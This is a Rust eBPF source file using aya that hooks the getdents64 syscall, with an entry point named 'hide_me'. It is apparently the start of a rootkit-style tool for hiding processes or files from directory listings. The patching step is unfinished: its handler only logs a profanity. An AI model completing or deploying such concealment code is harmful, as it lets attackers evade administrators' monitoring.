#![no_std]
#![no_main]

use core::mem::offset_of;

use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
    macros::{map, tracepoint},
    maps::{HashMap, ProgramArray},
    programs::TracePointContext,
};
use aya_log_ebpf::info;

use vmlinux::vmlinux::{linux_dirent64, task_struct};

#[path = "./vmlinux/mod.rs"]
mod vmlinux;

const PROG_HANDLER: u32 = 0;
const PROG_PATCHER: u32 = 1;

#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
#[allow(non_upper_case_globals)]
#[map]
static map_buffs: HashMap<u64, u64> = HashMap::<u64, u64>::with_max_entries(8192, 0);

#[allow(non_upper_case_globals)]
#[map]
static target_ppid: HashMap<u8, i32> = HashMap::<u8, i32>::with_max_entries(1, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    handle_getdents_enter(ctx).unwrap_or_else(|ret| ret)
}

fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let the_target_ppid = unsafe { target_ppid.get(&0) };

    if the_target_ppid.is_none() {
        return Err(0);
    }

    let the_target_ppid = the_target_ppid.unwrap();

    let pid_tgid = bpf_get_current_pid_tgid();

    if *the_target_ppid != 0 {
        let ppid = unsafe {
            let task = bpf_get_current_task() as *const task_struct;

            let real_parent = bpf_probe_read_kernel::<*const task_struct>(
                (task as usize + offset_of!(task_struct, real_parent)) as *const *const task_struct,
            );

            bpf_probe_read_kernel::<i32>(
                (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
            )
                .unwrap()
        };

        if ppid != *the_target_ppid {
            return Ok(0);
        }
    }

    // let pid = pid_tgid >> 32;
    // field:unsigned int fd;  offset:16;      size:8; signed:0;
    // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
    // field:unsigned int count;       offset:32;      size:8; signed:0;
    // let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
    // let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
    // info!(&ctx, "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count);

    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
    info!(&ctx, "pid_tgid is {}, dirp is 0x{:x}", pid_tgid ,dirp as u64);
    Ok(0)
}

#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
    info!(&ctx, "total_bytes_read is {}", total_bytes_read);
    // unsafe {
    //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
    //         return Ok(0);
    //     };
    // }
    Ok(0)
}

#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "fuck you");
    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
